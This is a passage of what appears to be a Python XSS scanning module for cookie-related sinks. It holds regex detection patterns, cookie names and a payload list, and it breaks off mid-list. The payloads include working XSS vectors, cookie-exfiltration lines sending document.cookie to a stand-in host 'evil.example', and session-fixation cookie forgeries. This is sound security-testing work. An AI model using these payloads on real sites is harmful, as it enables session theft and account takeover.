"""
Cookie-Based XSS Detection Module.

Detects and tests XSS vulnerabilities via cookie injection:
- document.cookie injection paths
- Cookie attribute bypass (SameSite, Secure)
- Cookie header reflection
- Cookie-based stored XSS
"""

import re
from typing import Dict, List, Optional, Set
from dataclasses import dataclass
from enum import Enum


class CookieSink(Enum):
    """Cookie-related XSS sink types."""
    DOCUMENT_COOKIE = "document_cookie"
    COOKIE_HEADER = "cookie_header"
    LOCAL_STORAGE_COOKIE = "local_storage_cookie"
    SESSION_STORAGE_COOKIE = "session_storage_cookie"
    INDEXEDDB_COOKIE = "indexeddb_cookie"


@dataclass
class CookieXSSVulnerability:
    """Cookie-based XSS vulnerability."""
    sink: CookieSink
    injection_point: str
    context: str
    payload: str
    severity: str
    bypass_attributes: List[str]


class CookieXSSDetector:
    """
    Advanced cookie-based XSS detector.
    Detects XSS vulnerabilities via cookie injection and reflection.
    """

    # Cookie sink patterns
    COOKIE_SINK_PATTERNS = {
        CookieSink.DOCUMENT_COOKIE: [
            # --- original ---
            r'document\.cookie',
            r'\.cookie\s*=',
            r'getCookie\s*\(',
            r'setCookie\s*\(',
            r'readCookie\s*\(',
            # --- variants: optional chaining / bracket / concat ---
            r'document\s*\?\s*\.\s*cookie',
            r'document\s*\[\s*[\'"]cookie[\'"]\s*\]',
            r'[\'"]coo[\'"]\s*\+\s*[\'"]kie[\'"]',
            r'[\'"]c[\'"]\s*\+\s*[\'"]ookie[\'"]',
            r'\bwindow\s*\[\s*[\'"]document[\'"]\s*\]\s*\.\s*cookie',
            # --- variants: direct cookie sinks ---
            r'\bdocument\s*\.\s*cookie\s*=',
            r'\bdocument\s*\.\s*cookie\s*\+=',
            r'\bdocument\s*\.\s*cookie\s*\.\s*split\s*\(',
            r'\.\s*getCookie\s*\(',
            r'\.\s*setCookie\s*\(',
            r'\.\s*deleteCookie\s*\(',
            r'\.\s*removeCookie\s*\(',
            r'\.\s*getCookies?\s*\(',
            # --- cookie libraries ---
            r'\bCookies\s*\.\s*(?:get|set|remove|erase)\b',                # js-cookie
            r'\bCookies\s*\[\s*[\'"](?:get|set|remove)',
            r'\bjQuery\s*\.\s*cookie\s*\(',                                  # jQuery cookie
            r'\$\.\s*cookie\s*\(',
            r'\$\.\s*removeCookie\s*\(',
            r'\bimport\s+\{\s*cookies?\s*\}\s+from\s+[\'"](?:js-cookie|universal-cookie|cookie)',
            r'\buseCookies?\s*\(',                                           # react-cookie
            r'\buseCookies?\s*\(\s*\)',
            r'\bwithCookies\s*\(',
            r'\bngxCookieService\b|\bCookieService\b',                       # Angular
            r'\bthis\s*\.\s*cookieService\s*\.\s*(?:get|set|delete|check|getAll)\b',
            r'\bcookieStore\s*\.\s*(?:get|getAll|set|delete)\b',              # Cookie Store API
            r'await\s+cookieStore\s*\.\s*(?:get|set|delete)\b',
            r'\bcookieStore\s*\.\s*addEventListener\b',
            r'\bdocument\s*\.\s*\[\s*[\'"]cookieStore[\'"]\s*\]',
            r'\bNetscape\s*\.\s*cookie\b',                                    # legacy
            r'\byahoo\s*\.\s*util\s*\.\s*Cookie\b',
            r'\bExt\s*\.\s*util\s*\.\s*Cookies\b',                            # ExtJS
            r'\bdojo\s*\.\s*cookie\b',
            r'\bgoog\s*\.\s*net\s*\.\s*Cookies\b',
            # --- wrappers / helpers in the wild ---
            r'\bcookieJar\s*\.\s*(?:get|set|remove)',
            r'\bCookieJar\b|\btough-cookie\b',
            r'\bset_cookie\s*\(',
            r'\bget_cookie\s*\(',
            r'\bdelete_cookie\s*\(',
            r'\bparseCookie\s*\(|\bserializeCookie\s*\(|\bCookie\.parse\b|\bCookie\.serialize\b',
            r'\bNookies\s*\.\s*(?:get|set|destroy)\b',                        # Next.js (Nookies)
            r'\bcookies?\s*\(\s*\)\s*\.\s*(?:get|set|delete|has)\b',         # Next.js cookies()
            r'\brequest\s*\.\s*cookies?\s*\.\s*(?:get|set)\b',                # various frameworks
            r'\bcookies?\s*\(\s*[\'"][^\'"]+[\'"]\s*\)',                     # Next 13 cookies(name)
        ],

        CookieSink.COOKIE_HEADER: [
            # --- original ---
            r'Cookie:\s*',
            r'Set-Cookie:\s*',
            r'request\.headers\.cookie',
            r'response\.headers\[["\']cookie',
            # --- variants: header getters / setters ---
            r'response\.headers\.set\s*\(\s*[\'"]Set-Cookie',
            r'response\.headers\.append\s*\(\s*[\'"]Set-Cookie',
            r'response\.headers\.get\s*\(\s*[\'"]Set-Cookie',
            r'res\s*\.\s*setHeader\s*\(\s*[\'"]Set-Cookie',
            r'res\s*\.\s*header\s*\(\s*[\'"]Set-Cookie',
            r'res\s*\.\s*append\s*\(\s*[\'"]Set-Cookie',
            r'res\s*\.\s*cookie\s*\(',                                        # Express
            r'res\s*\.\s*clearCookie\s*\(',                                   # Express
            r'reply\s*\.\s*setCookie\s*\(',                                   # Fastify / Hapi
            r'reply\s*\.\s*clearCookie\s*\(',
            r'ctx\s*\.\s*cookies\s*\.\s*(?:get|set)\s*\(',                    # Koa
            r'ctx\s*\.\s*cookie\s*=',                                          # Koa
            r'h\s*\.\s*state\s*\(\s*[\'"][^\'"]+[\'"]\s*,\s*[^)]+\)\s*;?[^;\n]{0,80}Set-Cookie',  # Hapi
            r'\bcookie\s*\(\s*name\s*,',                                      # generic
            r'\bset_cookie\s*\(',                                             # Flask / Django / Tornado
            r'\bdelete_cookie\s*\(',
            r'\bresponse\s*\.\s*set_cookie\s*\(',                              # Django
            r'\bresponse\s*\.\s*delete_cookie\s*\(',
            r'\bHttpResponse\s*\(\s*\)\s*\.\s*set_cookie\s*\(',
            r'\bsetcookie\s*\(',                                              # PHP (case-insensitive)
            r'\bsetcookie\s*\(',                                              # PHP
            r'\bheader\s*\(\s*[\'"]Set-Cookie:',
            r'\bheader\s*\(\s*[\'"]set-cookie:',
            r'\$_\s*COOKIE\b',                                                # PHP superglobal
            r'\baddCookie\s*\(',                                              # Java Servlet
            r'\bresponse\s*\.\s*addCookie\s*\(',
            r'\bnew\s+javax\s*\.\s*servlet\s*\.\s*http\s*\.\s*Cookie\b',
            r'\bnew\s+Cookie\s*\(\s*[\'"][^\'"]+[\'"]\s*,',
            r'\bHttpCookie\b',                                                # .NET
            r'\bResponse\s*\.\s*Cookies\s*\.\s*Add\s*\(',
            r'\bRequest\s*\.\s*Cookies\s*\[',
            r'\bHttpContext\s*\.\s*Current\s*\.\s*Request\s*\.\s*Cookies\b',
            r'\bhttp\s*\.\s*CookieJar\b',                                     # Go
            r'\bhttp\s*\.\s*SetCookie\s*\(',
            r'\br\s*\.\s*AddCookie\s*\(',
            r'\bSelenium\s*\.\s*WebDriver\s*\.\s*Cookies\b',                   # automation / scrapers
            r'\bdriver\s*\.\s*manage\s*\(\s*\)\s*\.\s*getCookies\b',
            # --- low-level header manipulation ---
            r'[\'"]Cookie[\'"]\s*[,:]\s*[\'"][^\'"]*=[^\'"]*[\'"]',
            r'[\'"]Set-Cookie[\'"]\s*[,:]\s*[\'"][^\'"]*=[^\'"]*[\'"]',
            r'headers\s*\[\s*[\'"](?:cookie|set-cookie)[\'"]\s*\]',
            r'headers\s*\.\s*(?:get|set|append|has)\s*\(\s*[\'"](?:cookie|set-cookie)[\'"]',
            # --- obfuscated header keys ---
            r'[\'"]Set[\'"]\s*\+\s*[\'"][-]?Cookie[\'"]',
            r'[\'"]set-[\'"]\s*\+\s*[\'"]cookie[\'"]',
            r'[\'"]coo[\'"]\s*\+\s*[\'"]kie[\'"]\s*:',
            r'[\'"]Set[\'"]\s*\+\s*[\'"]-[Cc]ookie[\'"]',
            # --- response header serialization ---
            r'\bserializeCookie\s*\(|\bstringifyCookie\s*\(|\bencodeCookie\s*\(',
            r'\btoCookieString\s*\(|\bcookieToString\s*\(',
        ],

        CookieSink.LOCAL_STORAGE_COOKIE: [
            # --- original ---
            r'localStorage\.getItem\s*\(\s*["\']cookie',
            r'localStorage\.setItem\s*\(\s*["\']cookie',
            r'localStorage\[["\']cookie',
            # --- variants: optional chaining / bracket / concat ---
            r'localStorage\s*\?\s*\.\s*getItem\s*\(\s*[\'"]cookie',
            r'localStorage\s*\?\s*\.\s*setItem\s*\(\s*[\'"]cookie',
            r'localStorage\s*\[\s*[\'"](?:cookie|cookies)[\'"]\s*\]',
            r'localStorage\s*\[\s*[\'"]get[\'"]\s*\+\s*[\'"]Item[\'"]\s*\]',
            r'localStorage\s*\.\s*\[\s*[\'"]getItem[\'"]\s*\]\s*\(\s*[\'"]cookie',
            r'window\s*\.\s*localStorage\s*(?:\.|\[)\s*[\'"]?cookie',
            r'self\s*\.\s*localStorage\s*(?:\.|\[)\s*[\'"]?cookie',
            # --- variants: named cookie stores ---
            r'localStorage\s*\.\s*getItem\s*\(\s*[\'"]session[\'"]',
            r'localStorage\s*\.\s*getItem\s*\(\s*[\'"]token[\'"]',
            r'localStorage\s*\.\s*getItem\s*\(\s*[\'"]jwt[\'"]',
            r'localStorage\s*\.\s*getItem\s*\(\s*[\'"]auth[\'"]',
            r'localStorage\s*\.\s*getItem\s*\(\s*[\'"]access_token[\'"]',
            r'localStorage\s*\.\s*getItem\s*\(\s*[\'"]id_token[\'"]',
            r'localStorage\s*\.\s*setItem\s*\(\s*[\'"]token[\'"]',
            r'localStorage\s*\.\s*setItem\s*\(\s*[\'"]jwt[\'"]',
            r'localStorage\s*\.\s*setItem\s*\(\s*[\'"]session[\'"]',
            r'localStorage\s*\.\s*setItem\s*\(\s*[\'"]auth[\'"]',
            r'localStorage\s*\.\s*setItem\s*\(\s*[\'"]access_token[\'"]',
            # --- variants: iteration over all keys looking for cookies ---
            r'localStorage\s*\.\s*length\b|\blocalStorage\s*\.\s*key\s*\(',
            r'for\s*\([^)]*localStorage',
            r'Object\s*\.\s*keys\s*\(\s*localStorage\s*\)',
            # --- variants: wrappers ---
            r'\buseLocalStorage\s*\(\s*[\'"]cookie',
            r'\buseStorage\s*\(\s*[\'"]cookie',
            r'\bVueUse\s*\.\s*useLocalStorage\b',
            r'\$localStorage\s*(?:\.|\[)\s*cookie',                            # ngStorage
        ],

        CookieSink.SESSION_STORAGE_COOKIE: [
            # --- original ---
            r'sessionStorage\.getItem\s*\(\s*["\']cookie',
            r'sessionStorage\.setItem\s*\(\s*["\']cookie',
            r'sessionStorage\[["\']cookie',
            # --- variants: optional chaining / bracket / concat ---
            r'sessionStorage\s*\?\s*\.\s*getItem\s*\(\s*[\'"]cookie',
            r'sessionStorage\s*\?\s*\.\s*setItem\s*\(\s*[\'"]cookie',
            r'sessionStorage\s*\[\s*[\'"](?:cookie|cookies)[\'"]\s*\]',
            r'sessionStorage\s*\[\s*[\'"]get[\'"]\s*\+\s*[\'"]Item[\'"]\s*\]',
            r'sessionStorage\s*\.\s*\[\s*[\'"]getItem[\'"]\s*\]\s*\(\s*[\'"]cookie',
            r'window\s*\.\s*sessionStorage\s*(?:\.|\[)\s*[\'"]?cookie',
            r'self\s*\.\s*sessionStorage\s*(?:\.|\[)\s*[\'"]?cookie',
            # --- variants: named cookie stores ---
            r'sessionStorage\s*\.\s*getItem\s*\(\s*[\'"]session[\'"]',
            r'sessionStorage\s*\.\s*getItem\s*\(\s*[\'"]token[\'"]',
            r'sessionStorage\s*\.\s*getItem\s*\(\s*[\'"]jwt[\'"]',
            r'sessionStorage\s*\.\s*getItem\s*\(\s*[\'"]auth[\'"]',
            r'sessionStorage\s*\.\s*getItem\s*\(\s*[\'"]access_token[\'"]',
            r'sessionStorage\s*\.\s*setItem\s*\(\s*[\'"]token[\'"]',
            r'sessionStorage\s*\.\s*setItem\s*\(\s*[\'"]jwt[\'"]',
            r'sessionStorage\s*\.\s*setItem\s*\(\s*[\'"]auth[\'"]',
            # --- wrappers / iteration ---
            r'sessionStorage\s*\.\s*length\b|\bsessionStorage\s*\.\s*key\s*\(',
            r'\buseSessionStorage\s*\(\s*[\'"]cookie',
            r'\$sessionStorage\s*(?:\.|\[)\s*cookie',
        ],

        CookieSink.INDEXEDDB_COOKIE: [
            # --- original ---
            r'indexedDB.*cookie',
            r'IDBObjectStore.*cookie',
            # --- variants: db names / stores ---
            r'\bindexedDB\s*\.\s*open\s*\(\s*[\'"][^\'"]*cookie[^\'"]*[\'"]',
            r'\bindexedDB\s*\.\s*open\s*\(\s*[\'"](?:auth|cache|store|kv|session|tokens?)[\'"]',
            r'\.\s*objectStore\s*\(\s*[\'"][^\'"]*cookie',
            r'\.\s*createObjectStore\s*\(\s*[\'"][^\'"]*cookie',
            r'\.\s*objectStore\s*\(\s*[\'"](?:auth|session|tokens?|cache)[\'"]',
            r'\.\s*createObjectStore\s*\(\s*[\'"](?:auth|session|tokens?|cache)[\'"]',
            # --- idb wrappers ---
            r'\bidb\s*\.\s*openDB\s*\(\s*[\'"][^\'"]*cookie',
            r'\bidb\s*\.\s*openDB\s*\(\s*[\'"][^\'"]+[\'"]\s*,\s*\d+',
            r'\bopenDB\s*\(\s*[\'"][^\'"]*cookie',
            r'\bDexie\s*\(\s*[\'"][^\'"]*cookie',
            r'\bnew\s+Dexie\s*\(',
            r'\blocalForage\s*\.\s*(?:setItem|getItem)\s*\(\s*[\'"]cookie',
            r'\blocalForage\s*\.\s*(?:setItem|getItem)\s*\(\s*[\'"](?:auth|token|session)[\'"]',
            r'\blocalforage\b',
            # --- generic IDB stores that look like cookie/auth material ---
            r'\bIDBKeyRange\b[^;\n]{0,200}(?:cookie|token|session|auth)',
            r'\.\s*(?:get|put|add|delete)\s*\(\s*[\'"](?:cookie|token|session|auth)[\'"]',
        ],
    }

    # Cookie attribute bypass patterns
    ATTRIBUTE_BYPASS_PATTERNS = {
        "samesite": [
            # --- original ---
            r'SameSite\s*=\s*None',
            r'SameSite\s*=\s*Lax',
            r'SameSite\s*=\s*',
            # --- insecure / missing ---
            r'samesite\s*=\s*none',
            r'samesite\s*=\s*none\s*;',                                        # None without Secure is ignored by browsers, but still an anti-pattern
            r'SameSite\s*=\s*Unspecified',
            r'SameSite\s*=\s*[A-Za-z]+',
            # --- obfuscated / case ---
            r'same-site\s*=',
            r'same_site\s*=',
            r'samesite\s*:\s*[\'"]?none',
            r'sameSite\s*:\s*[\'"]None[\'"]',
            r'sameSite\s*:\s*[\'"]none[\'"]',
            r'[\'"]SameSite[\'"]\s*[,:=]\s*[\'"]?(?:none|lax)',
            r'[\'"]samesite[\'"]\s*[,:=]\s*[\'"]?(?:none|lax|strict)',
            r'same_?site\s*[,:=]\s*[\'"]?none',
            # --- framework specific ---
            r'same_site\s*=\s*[\'"]None[\'"]',                                  # Django
            r'samesite\s*=\s*[\'"]none[\'"]',                                    # Flask
            r'sameSite\s*:\s*true',                                              # some libs
            r'sameSite\s*:\s*[\'"]none[\'"]',                                    # Express cookie
            r'sameSite\s*:\s*false',
            r'\.SameSite\s*=\s*SameSiteMode\.None',                              # ASP.NET
            r'\.SameSite\s*=\s*SameSiteMode\.Unspecified',
            r'cookie\.sameSite\s*=\s*[\'"]None[\'"]',                            # Go
            r'\.setSameSite\s*\(\s*[\'"]None[\'"]',                              # Servlet
            # --- missing SameSite entirely (flag via absence isn't possible here, but common anti-pattern) ---
            r'(?:document\s*\.\s*cookie\s*=[^;]{0,300})$',                       # simple document.cookie with no attr
        ],
        "secure": [
            # --- original ---
            r'Secure',
            r'secure\s*=\s*true',
            # --- missing / misconfigured ---
            r'secure\s*=\s*false',
            r'secure\s*:\s*false',
            r'[\'"]Secure[\'"]\s*[,:=]\s*false',
            r'secure\s*:\s*[\'"]false[\'"]',
            # --- obfuscated / case ---
            r'[\'"]secure[\'"]\s*[,:=]\s*(?:true|false|1|0)',
            r'\bsecure\s*[,:]\s*1',
            r'\bsecure\s*[,:]\s*0',
            # --- framework specific ---
            r'secure\s*=\s*[\'"]?(?:false|0)[\'"]?',                            # various
            r'\.Secure\s*=\s*false',                                             # ASP.NET
            r'cookie\.secure\s*=\s*false',                                       # Go
            r'\.setSecure\s*\(\s*false\s*\)',                                    # Servlet
            r'SESSION_COOKIE_SECURE\s*=\s*False',                                # Django settings
            r'SESSION_COOKIE_SECURE\s*=\s*False\b',
            r'CSRF_COOKIE_SECURE\s*=\s*False',
            r'secure\s*:\s*false\s*[,}]',                                       # Express cookie
            # --- anti-pattern: cookie set over HTTP with `Secure` blindly ---
            r'document\s*\.\s*cookie\s*=[^;]{0,200};\s*Secure',
        ],
        "httponly": [
            # --- original ---
            r'HttpOnly',
            r'httponly\s*=\s*true',
            # --- missing / misconfigured ---
            r'httponly\s*=\s*false',
            r'httpOnly\s*:\s*false',
            r'[\'"]HttpOnly[\'"]\s*[,:=]\s*false',
            # --- obfuscated / case ---
            r'[\'"]httponly[\'"]\s*[,:=]\s*(?:true|false|1|0)',
            r'\bhttponly\s*[,:]\s*1',
            r'\bhttponly\s*[,:]\s*0',
            # --- framework specific ---
            r'httponly\s*=\s*[\'"]?(?:false|0)[\'"]?',
            r'\.HttpOnly\s*=\s*false',                                           # ASP.NET
            r'cookie\.httpOnly\s*=\s*false',                                     # Go
            r'\.setHttpOnly\s*\(\s*false\s*\)',                                  # Servlet
            r'SESSION_COOKIE_HTTPONLY\s*=\s*False',                              # Django
            r'CSRF_COOKIE_HTTPONLY\s*=\s*False',
            r'httpOnly\s*:\s*false\s*[,}]',                                     # Express
            # --- anti-pattern: JS reads what *should* be HttpOnly ---
            r'document\s*\.\s*cookie\s*\.\s*(?:match|includes|indexOf|split)\s*\(',
        ],
        "path": [
            # --- original ---
            r'Path\s*=\s*/',
            r'Path\s*=\s*;',
            # --- over-broad / narrow paths ---
            r'Path\s*=\s*/;',
            r'path\s*=\s*[\'"]?/[\'"]?;',
            r'Path\s*=\s*/admin',
            r'path\s*=\s*/admin',
            r'path\s*=\s*/login',
            r'path\s*=\s*/api',
            r'path\s*=\s*[\'"][^\'"]*\.\./',                                     # traversal in path
            r'path\s*=\s*[\'"][^\'"]*\*',                                        # wildcard
            # --- obfuscated / case ---
            r'[\'"]Path[\'"]\s*[,:=]\s*[\'"]?/',
            r'[\'"]path[\'"]\s*[,:=]\s*[\'"]?/',
            r'\bpath\s*[,:]\s*[\'"]?/[\'"]?[,}]',
            # --- framework specific ---
            r'path\s*=\s*[\'"]/[\'"]',                                            # Flask
            r'\.Path\s*=\s*[\'"]/[\'"]',                                          # ASP.NET
            r'cookie\.path\s*=\s*[\'"]/[\'"]',                                    # Go
            r'\.setPath\s*\(\s*[\'"]/[\'"]\s*\)',                                 # Servlet
            r'SESSION_COOKIE_PATH\s*=\s*[\'"]/[\'"]',                             # Django
            r'path\s*:\s*[\'"]/[\'"]\s*[,}]',                                     # Express
            # --- conflicting paths (cookie tossing) ---
            r'path\s*=\s*[\'"]/[\'"]',                                            # any cookie set at root
        ],
        "domain": [
            # --- original ---
            r'Domain\s*=\s*\.',
            r'Domain\s*=\s*localhost',
            # --- subdomain / over-broad ---
            r'Domain\s*=\s*\.?[A-Za-z0-9-]+\.(?:com|net|org|io|co|dev)',
            r'Domain\s*=\s*\.example\.',
            r'domain\s*=\s*[\'"][^\'"]*\.(?:com|net|org|io|co|dev|local)[\'"]',
            r'domain\s*=\s*[\'"]\.',
            r'domain\s*=\s*[\'"]\.[a-z0-9-]+\.[a-z]{2,}[\'"]',
            # --- obfuscated / case ---
            r'[\'"]Domain[\'"]\s*[,:=]\s*[\'"]?\.',
            r'[\'"]domain[\'"]\s*[,:=]\s*[\'"]?[a-z0-9.-]+',
            # --- framework specific ---
            r'domain\s*=\s*[\'"][^\'"]+[\'"]',                                    # Flask
            r'\.Domain\s*=\s*[\'"][^\'"]+[\'"]',                                  # ASP.NET
            r'cookie\.domain\s*=\s*[\'"][^\'"]+[\'"]',                            # Go
            r'\.setDomain\s*\(\s*[\'"][^\'"]+[\'"]\s*\)',                         # Servlet
            r'SESSION_COOKIE_DOMAIN\s*=\s*[\'"][^\'"]+[\'"]',                     # Django
            r'domain\s*:\s*[\'"][^\'"]+[\'"]\s*[,}]',                             # Express
            # --- localhost / dev leakage ---
            r'domain\s*=\s*[\'"]localhost[\'"]',
            r'domain\s*=\s*[\'"]127\.0\.0\.1[\'"]',
            r'domain\s*=\s*[\'"]0\.0\.0\.0[\'"]',
        ],
        # --- added categories -------------------------------------------------
        "prefix": [
            # Cookie name prefix rules that a compliant Set-Cookie MUST satisfy.
            # Violations of these prefixes are classic cookie-tossing vectors.
            r'__Host-',
            r'__Secure-',
            r'SET\s+__Host-',
            r'SET\s+__Secure-',
            r'[\'"]__Host-',
            r'[\'"]__Secure-',
            # prefix bypass attempts: __Host- without Secure, without Path=/, with Domain
            r'__Host-[^=;\n]{1,120};\s*(?!.*Secure)',
            r'__Host-[^=;\n]{1,120};\s*(?!.*Path=/)',
            r'__Host-[^=;\n]{1,120};\s*(?!.*Domain=).*Domain=',
            r'__Secure-[^=;\n]{1,120};\s*(?!.*Secure)',
            # lower-case / mixed-case prefix (ignored by browser, but abused in logs)
            r'__host-|__secure-|__HOST-|__SECURE-',
        ],
        "expiry": [
            # Cookie lifetime indicators
            r'Max-Age\s*=\s*-?\d+',
            r'Expires\s*=\s*[^;\n]+',
            r'expires\s*:\s*new\s+Date\s*\(\s*[\'"]?',
            r'maxAge\s*:\s*-?\d+',
            r'maxAge\s*:\s*[\'"]-',
            r'max-age\s*=\s*0',
            r'Max-Age\s*=\s*0',
            r'expires\s*=\s*[\'"]?Thu,\s*01\s*Jan\s*1970',                      # epoch (delete)
            r'expires\s*:\s*[\'"]?1970',
            r'maxAge\s*:\s*[0-9]+',
            r'maxAge\s*:\s*60\s*\*\s*60\s*\*\s*24',                             # 1 day
            r'maxAge\s*:\s*[0-9]+\s*\*\s*[0-9]+\s*\*\s*[0-9]+\s*\*\s*365',      # >1 year
            r'\.MaxAge\s*=\s*-?\d+',                                             # ASP.NET
            r'SESSION_COOKIE_AGE\s*=\s*\d+',
            r'SESSION_EXPIRE_AT_BROWSER_CLOSE\s*=\s*True',                       # session cookie
        ],
        "partitioned": [
            # CHIPS (Cookies Having Independent Partitioned State)
            r'Partitioned',
            r'partitioned\s*=\s*true',
            r'partitioned\s*:\s*true',
            r'partitioned\s*[,:=]\s*1',
            r'[\'"]Partitioned[\'"]\s*[,:=]',
            r'partitioned\s*:\s*false',
            r'Secure\s*;\s*Partitioned',
        ],
        "priority": [
            r'Priority\s*=\s*(?:Low|Medium|High)',
            r'priority\s*:\s*[\'"](?:low|medium|high)[\'"]',
            r'[\'"]Priority[\'"]\s*[,:=]',
        ],
    }

    # XSS payloads for cookie injection
    COOKIE_XSS_PAYLOADS = [
        # --- 1. Basic (original) ------------------------------------------
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
        "%3Cscript%3Ealert(1)%3C/script%3E",
        "<script>document.cookie='xss=x'</script>",

        # --- 2. Basic event handlers (added) ------------------------------
        "<body onload=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<marquee onstart=alert(1)>",
        "<input autofocus onfocus=alert(1)>",
        "<select autofocus onfocus=alert(1)>",
        "<textarea autofocus onfocus=alert(1)>",
        "<video><source onerror=alert(1)></video>",
        "<audio src=x onerror=alert(1)>",
        "<svg><script>alert(1)</script></svg>",
        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
        "<svg><set attributeName=onmouseover to=alert(1)>",
        "<svg><a xlink:href=javascript:alert(1)><text>click</text></a></svg>",
        "<iframe srcdoc=\"<script>alert(1)</script>\">",
        "<math><mtext><img src=x onerror=alert(1)>",

        # --- 3. Cookie theft / exfil payloads (added) ---------------------
        "<script>new Image().src='//evil.example/'+document.cookie</script>",
        "<script>fetch('//evil.example/?c='+encodeURIComponent(document.cookie))</script>",
        "<script>location='//evil.example/?c='+document.cookie</script>",
        "<script>(new Image).src='//evil.example/?'+btoa(document.cookie)</script>",
        "<script>document.location='http://evil.example/'+document.cookie</script>",
        "<script>navigator.sendBeacon('//evil.example',document.cookie)</script>",
        "<img src=x onerror=\"fetch('//evil.example/?c='+document.cookie)\">",
        "<svg onload=\"new Image().src='//evil.example/'+document.cookie\">",
        "<script>fetch('//evil.example',{method:'POST',body:document.cookie})</script>",
        "<script>window.open('//evil.example/?c='+document.cookie)</script>",

        # --- 4. Cookie forging / session fixation (added) -----------------
        "<script>document.cookie='session=ATTACKER_SESSION; path=/'</script>",
        "<script>document.cookie='sessionid=ATTACKER_SESSION; path=/; domain=.example.com'</script>",
        "<script>document.cookie='csrf=1; path=/; SameSite=None; Secure'</script>",
        "<script>document.cookie='auth=x; path=/; HttpOnly=false'</script>",
        "<script>document.cookie='__Host-auth=x; path=/admin'</script>",
        "<script>document.cookie='__Secure-auth=x'</script>",

        # --- 5. Obfuscated / encoded (added) ------------------------------
        "<script>eval(atob('YWxlcnQoMSk='))</script>",
        "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
        "<script>\\u0061lert(1)</script>",
        "<script>\\x61lert(1)</script>",
        "<script>top['al'+'ert'](1)</script>",
        "<script>[].constructor.constructor('alert(1)')()</script>",
        "<script>(0,eval)('alert(1)')</script>",
        "<script>Function('alert(1)')()</script>",
        "<script>setTimeout('alert(1)',0)</script>",
        "<ScRiPt>alert(1)</sCrIpT>",
        "<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>",
        "<img src=x onerror\n=alert(1)>",
        "java%0ascript:alert(1)",
        "java%09script:alert(1)",
        "&#106;avascript:alert(1)",
        "javascript&colon;alert(1)",
        "javascript://%0Aalert(1)",

        # --- 6. mXSS / polyglots (added) ----------------------------------
        "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
        "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
        "<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>",
        "\"><img src=x onerror=alert(1)>\".<script>alert(1)</script>",
        "'><svg/onload=alert(1)>",
        "--><svg/onload=alert(1)>",
        "</title><svg/onload=alert(1)>",
        "</textarea><svg/onload=alert(1)>",
        "</style><svg/onload=alert(1)>",

        # --- 7. Data / URL schemes (added) -------------------------------
        "data:text/html,<script>alert(1)</script>",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        "data:image/svg+xml,<svg onload=alert(1)>",
        "vbscript:msgbox(1)",

        # --- 8. URL-encoded / HTML-entity encoded (added) -----------------
        "%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E",
        "%3Csvg%20onload%3Dalert(1)%3E",
        "%22%3E%3Csvg%2Fonload%3Dalert(1)%3E",
        "%253Cscript%253Ealert(1)%253C%252Fscript%253E",                      # double-encoded
        "%u003Cscript%u003Ealert(1)%u003C/script%u003E",                      # IIS-style
        "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
        "&#60;img src=x onerror=alert(1)&#62;",

        # --- 9. Cookie-name injection payloads (added) -------------------
        # Some apps reflect cookie *names* into HTML — try odd names.
        "<script>alert(1)</script>",
        "\"><script>alert(1)</script>",
        "'><script>alert(1)</script>",
        "--><script>alert(1)</script>",
        "\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E",
        "'';!--\"<XSS>=&{()}",                                              # classic fuzzer probe
    ]

    # Common cookie names that might be reflected
    COMMON_COOKIE_NAMES = [
        # --- original ---
        "session",
        "sessionid",
        "user",
        "username",
        "auth",
        "token",
        "csrf",
        "xsrf",
        "language",
        "theme",
        "preferences",
        "remember",
        "keep",
        "uid",
        "userid",
        "email",

        # --- session IDs (framework specific) -----------------------------
        "PHPSESSID",
        "JSESSIONID",
        "ASP.NET_SessionId",
        "ASPSESSIONID",
        "CFID",
        "CFTOKEN",
        "JSESSIONIDSSO",
        "SID",
        "sid",
        "sess",
        "sessid",
        "sess_id",
        "session_id",
        "SessionId",
        "SessionID",
        "session_token",
        "sessionToken",
        "session-id",
        "sid.sig",
        "connect.sid",                                                      # Express / Connect
        "koa:sess",
        "koa:sess.sig",
        "_session_id",                                                      # Rails
        "_rails_session",
        "_myapp_session",
        "rack.session",
        "_s",
        "PLAY_SESSION",                                                     # Play Framework
        "PLAY_FLASH",
        "Laravel_session",                                                  # Laravel
        "laravel_session",
        "XSRF-TOKEN",                                                       # Laravel CSRF
        "ci_session",                                                       # CodeIgniter
        "symfony",
        "flask_session",
        "express:sess",

        # --- auth / tokens ------------------------------------------------
        "jwt",
        "jwt_token",
        "access_token",
        "refresh_token",
        "id_token",
        "auth_token",
        "authtoken",
        "authToken",
        "bearer",
        "bearer_token",
        "api_key",
        "apikey",
        "api-key",
        "oauth_token",
        "oauth2_token",
        "remember_me",
        "rememberMe",
        "remember-me",
        "remember_token",
        "persistent_token",
        "login",
        "logged_in",
        "is_logged_in",
        "isAuthenticated",
        "loggedIn",

        # --- CSRF / anti-forgery ------------------------------------------
        "csrftoken",                                                        # Django
        "csrf_token",
        "csrfmiddlewaretoken",
        "__RequestVerificationToken",                                       # ASP.NET
        "X-CSRF-Token",
        "X-CSRFToken",
        "_csrf",
        "authenticity_token",                                               # Rails
        "csrfToken",

        # --- identity providers / SSO -------------------------------------
        "mod_auth_openidc_session",
        "auth0",
        "auth0_session",
        "AUTH_SESSION_ID",                                                  # Keycloak
        "KEYCLOAK_IDENTITY",
        "KEYCLOAK_SESSION",
        "AWSALB",                                                           # AWS load balancer
        "AWSALBCORS",
        "AWSELB",
        "JSESSIONID",
        "OktaSession",
        "okta_session",
        "SAML",
        "SAMLResponse",
        "AzureAppProxyAccessCookie",
        "AppServiceAuthSession",                                            # Azure App Service
        ".AspNetCore.Cookies",                                              # ASP.NET Core
        ".AspNetCore.Session",
        ".AspNetCore.Antiforgery",
        ".AspNetCore.Identity.Application",
        "ARRAffinity",
        "ARRAffinitySameSite",

        # --- WAF / CDN / tracking -----------------------------------------
